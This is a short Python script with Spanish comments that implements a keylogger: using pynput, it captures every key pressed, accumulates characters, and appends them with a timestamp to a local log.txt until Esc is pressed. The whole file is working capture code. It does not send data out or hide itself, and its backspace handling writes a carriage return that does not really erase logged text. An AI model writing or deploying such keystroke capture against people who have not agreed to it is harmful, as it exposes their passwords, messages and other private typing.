from pynput.keyboard import Key, Listener
from datetime import datetime

log_filename = "log.txt"
current_text = []  # Lista para almacenar el texto actual temporalmente

# Función para iniciar el log con la fecha y hora
def iniciar_log():
    with open(log_filename, 'a') as logfile:
        logfile.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}:\n")

# Función para manejar las teclas presionadas
def presionar_tecla(key):
    global current_text

    if key == Key.space:
        current_text.append(" ")  # Solo añadir un espacio a la lista temporal
    elif key == Key.enter:
        guardar_texto()  # Guardar el texto acumulado en el archivo y hacer un salto de línea
    elif key == Key.backspace:
        if current_text:
            current_text.pop()  # Borrar el último carácter
        actualizar_log()  # Actualizar el archivo después de borrar
    elif key == Key.esc:
        guardar_texto()  # Guardar lo que hay antes de salir
        return False  # Detener el listener
    else:
        try:
            current_text.append(key.char)  # Añadir el carácter presionado a la lista temporal
        except AttributeError:
            pass  # Ignorar teclas especiales

# Guardar el texto acumulado en el archivo
def guardar_texto():
    if current_text:  # Si hay algo en la lista temporal
        with open(log_filename, 'a') as logfile:
            logfile.write("".join(current_text) + "\n")  # Guardar en el archivo y hacer un salto de línea
        current_text.clear()  # Limpiar la lista temporal

# Actualizar el archivo en tiempo real solo cuando se presiona backspace
def actualizar_log():
    with open(log_filename, 'r+') as logfile:
        logfile.seek(0, 2)  # Mover al final del archivo
        logfile.write("\r")  # Borrar lo que se eliminó sin hacer un salto de línea
        logfile.write("".join(current_text))  # Sobreescribir el texto actualizado

# Iniciar el listener
iniciar_log()  # Añadir la fecha y hora al inicio del archivo
with Listener(on_press=presionar_tecla) as listener:
    listener.join()
